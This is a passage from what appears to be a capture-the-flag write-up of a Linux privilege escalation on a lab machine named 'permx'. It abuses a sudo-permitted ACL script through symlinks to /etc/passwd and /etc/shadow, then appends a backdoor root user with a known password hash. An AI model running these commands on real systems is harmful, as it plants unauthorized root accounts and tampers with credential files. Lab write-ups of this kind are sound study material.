+<span class="line"><span style="color:#F8F8F2">    secure_path</span><span style="color:#F92672">=</span><span style="color:#E6DB74">/usr/local/sbin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/usr/local/bin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/usr/sbin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/usr/bin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/sbin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/bin</span><span style="color:#AE81FF">\:</span><span style="color:#E6DB74">/snap/bin,</span></span>
+<span class="line"><span style="color:#A6E22E">    use_pty</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A6E22E">User</span><span style="color:#E6DB74"> mtz</span><span style="color:#E6DB74"> may</span><span style="color:#E6DB74"> run</span><span style="color:#E6DB74"> the</span><span style="color:#E6DB74"> following</span><span style="color:#E6DB74"> commands</span><span style="color:#E6DB74"> on</span><span style="color:#E6DB74"> permx:</span></span>
+<span class="line"><span style="color:#F8F8F2">    (</span><span style="color:#A6E22E">ALL</span><span style="color:#E6DB74"> :</span><span style="color:#E6DB74"> ALL</span><span style="color:#F8F8F2">) </span><span style="color:#A6E22E">NOPASSWD:</span><span style="color:#E6DB74"> /opt/acl.sh</span></span></code></pre>
+<h4 id="analyzing-aclsh">Analyzing <code>acl.sh</code></h4>
+<p>The <code>acl.sh</code> script is as follows:</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#88846F">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F92672">if</span><span style="color:#F8F8F2"> [ </span><span style="color:#E6DB74">"</span><span style="color:#FD971F">$#</span><span style="color:#E6DB74">"</span><span style="color:#F92672"> -ne</span><span style="color:#AE81FF"> 3</span><span style="color:#F8F8F2"> ]; </span><span style="color:#F92672">then</span></span>
+<span class="line"><span style="color:#A6E22E">    /usr/bin/echo</span><span style="color:#E6DB74"> "Usage: </span><span style="color:#FD971F;font-style:italic">$0</span><span style="color:#E6DB74"> user perm file"</span></span>
+<span class="line"><span style="color:#66D9EF">    exit</span><span style="color:#AE81FF"> 1</span></span>
+<span class="line"><span style="color:#F92672">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">user</span><span style="color:#F92672">=</span><span style="color:#E6DB74">"</span><span style="color:#FD971F;font-style:italic">$1</span><span style="color:#E6DB74">"</span></span>
+<span class="line"><span style="color:#F8F8F2">perm</span><span style="color:#F92672">=</span><span style="color:#E6DB74">"</span><span style="color:#FD971F;font-style:italic">$2</span><span style="color:#E6DB74">"</span></span>
+<span class="line"><span style="color:#F8F8F2">target</span><span style="color:#F92672">=</span><span style="color:#E6DB74">"</span><span style="color:#FD971F;font-style:italic">$3</span><span style="color:#E6DB74">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F92672">if</span><span style="color:#F8F8F2"> [[ </span><span style="color:#E6DB74">"</span><span style="color:#F8F8F2">$target</span><span style="color:#E6DB74">"</span><span style="color:#F92672"> !=</span><span style="color:#F8F8F2"> /home/mtz/</span><span style="color:#F92672">*</span><span style="color:#F92672"> ||</span><span style="color:#E6DB74"> "</span><span style="color:#F8F8F2">$target</span><span style="color:#E6DB74">"</span><span style="color:#F92672"> ==</span><span style="color:#F92672"> *</span><span style="color:#F8F8F2">..</span><span style="color:#F92672">*</span><span style="color:#F8F8F2"> ]]; </span><span style="color:#F92672">then</span></span>
+<span class="line"><span style="color:#A6E22E">    /usr/bin/echo</span><span style="color:#E6DB74"> "Access denied."</span></span>
+<span class="line"><span style="color:#66D9EF">    exit</span><span style="color:#AE81FF"> 1</span></span>
+<span class="line"><span style="color:#F92672">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#88846F"># Check if the path is a file</span></span>
+<span class="line"><span style="color:#F92672">if</span><span style="color:#F8F8F2"> [ </span><span style="color:#F92672">!</span><span style="color:#F92672"> -f</span><span style="color:#E6DB74"> "</span><span style="color:#F8F8F2">$target</span><span style="color:#E6DB74">"</span><span style="color:#F8F8F2"> ]; </span><span style="color:#F92672">then</span></span>
+<span class="line"><span style="color:#A6E22E">    /usr/bin/echo</span><span style="color:#E6DB74"> "Target must be a file."</span></span>
+<span class="line"><span style="color:#66D9EF">    exit</span><span style="color:#AE81FF"> 1</span></span>
+<span class="line"><span style="color:#F92672">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A6E22E">/usr/bin/sudo</span><span style="color:#E6DB74"> /usr/bin/setfacl</span><span style="color:#AE81FF"> -m</span><span style="color:#E6DB74"> u:"</span><span style="color:#F8F8F2">$user</span><span style="color:#E6DB74">":"</span><span style="color:#F8F8F2">$perm</span><span style="color:#E6DB74">"</span><span style="color:#E6DB74"> "</span><span style="color:#F8F8F2">$target</span><span style="color:#E6DB74">"</span></span></code></pre>
+<h4 id="breakdown-of-aclsh-script">Breakdown of <code>acl.sh</code> Script</h4>
+<ul>
+<li>
+<p><strong>Input Validation</strong>:</p>
+<ul>
+<li>The script expects three arguments: a username, permission, and target file.</li>
+<li>It checks if the number of arguments is exactly three. If not, it exits with a usage message.</li>
+</ul>
+</li>
+<li>
+<p><strong>Target Path Validation</strong>:</p>
+<ul>
+<li>The script ensures the target file is within <code>/home/mtz/</code> and does not contain <code>..</code> (to prevent directory traversal).</li>
+</ul>
+</li>
+<li>
+<p><strong>File Check</strong>:</p>
+<ul>
+<li>It verifies that the target is a file. If it is not, the script exits with an error message.</li>
+</ul>
+</li>
+<li>
+<p><strong>Setting ACLs</strong>:</p>
+<ul>
+<li>The script uses <code>setfacl</code> to modify the access control list (ACL) of the target file, granting the specified user the specified permissions.</li>
+</ul>
+</li>
+</ul>
+<h3 id="exploiting-aclsh">Exploiting <code>acl.sh</code></h3>
+<p>Given the script’s functionality, it was possible to exploit it as follows:</p>
+<ol>
+<li>
+<p><strong>Create Symbolic Links</strong>:</p>
+<ul>
+<li>A symbolic link to the <code>/etc/passwd</code> and <code>/etc/shadow</code> files was created in <code>/home/mtz</code>. This allows modifying these critical files through ACL changes.</li>
+</ul>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">ln</span><span style="color:#AE81FF"> -s</span><span style="color:#E6DB74"> /etc/passwd</span><span style="color:#E6DB74"> /home/mtz/passwd</span></span>
+<span class="line"><span style="color:#A6E22E">ln</span><span style="color:#AE81FF"> -s</span><span style="color:#E6DB74"> /etc/shadow</span><span style="color:#E6DB74"> /home/mtz/shadow</span></span></code></pre>
+</li>
+<li>
+<p><strong>Modify Permissions</strong>:</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>Use <code>/opt/acl.sh</code> to grant <code>mtz</code> write permissions to the symbolic links.</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">sudo</span><span style="color:#E6DB74"> /opt/acl.sh</span><span style="color:#E6DB74"> mtz</span><span style="color:#E6DB74"> rwx</span><span style="color:#E6DB74"> /home/mtz/passwd</span></span>
+<span class="line"><span style="color:#A6E22E">sudo</span><span style="color:#E6DB74"> /opt/acl.sh</span><span style="color:#E6DB74"> mtz</span><span style="color:#E6DB74"> rwx</span><span style="color:#E6DB74"> /home/mtz/shadow</span></span></code></pre>
+</li>
+</ul>
+<p>`</p>
+<h3 id="update-passwd-and-shadow-files">Update <code>passwd</code> and <code>shadow</code> Files</h3>
+<ul>
+<li>
+<p>Edit the <code>/home/mtz/passwd</code> and <code>/home/mtz/shadow</code> files to add a new root user with a known password hash.generate your own</p>
+</li>
+<li>
+<p>password hash with openssl and if you want to use mine the pasword is ‘naruto’</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#66D9EF">echo</span><span style="color:#E6DB74"> 'chef:x:0:0:root:/root:/bin/bash'</span><span style="color:#F92672"> >></span><span style="color:#E6DB74"> /home/mtz/passwd</span></span>
+<span class="line"><span style="color:#66D9EF">echo</span><span style="color:#E6DB74"> 'chef:$6$m.8UCPi1Mj9FRFMK$OR6ubVYKZzE9UFiGm4ahw0t680nd5m//Wj55/0apx9NjfyOML8bvTi19Bh7JfAEW0wm59BE5dp17VrKpu8UCI0:19742:0:99999:7:::'</span><span style="color:#F92672"> >></span><span style="color:#E6DB74"> /home/mtz/shadow</span></span></code></pre>
+</li>
+</ul>
+<p>`
+switch to the new user ‘chef’ and youre root
+i also wrote a script that does the escalation from mtz to root easily check the folder</p> </div></div></div> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col items-center justify-between gap-6 sm:flex-row"><div class="sm:w-7/12"><div class="text-3xl font-bold">Subscribe to my <span class="bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-transparent">Newsletters</span></div><p class="mt-3 text-gray-300">Join my newsletter to stay updated on the latest in cybersecurity, tips, and write-ups. Get exclusive insights straight to your inbox!.</p></div><div class="w-full sm:w-5/12"><form class="flex rounded-full bg-slate-800 px-4 py-2 focus-within:ring-2 focus-within:ring-cyan-600 hover:ring-2 hover:ring-cyan-600"><input class="w-full appearance-none bg-slate-800 focus:outline-none"/><button class="ml-2 shrink-0 rounded-full bg-gradient-to-br from-sky-500 to-cyan-400 px-3 py-1 text-sm font-medium hover:from-sky-700 hover:to-cyan-600 focus:outline-none focus:ring-2 focus:ring-cyan-600/50" type="submit">Subscribe</button></form></div></div></div>  <!-- <Footer /> --> </body></html>
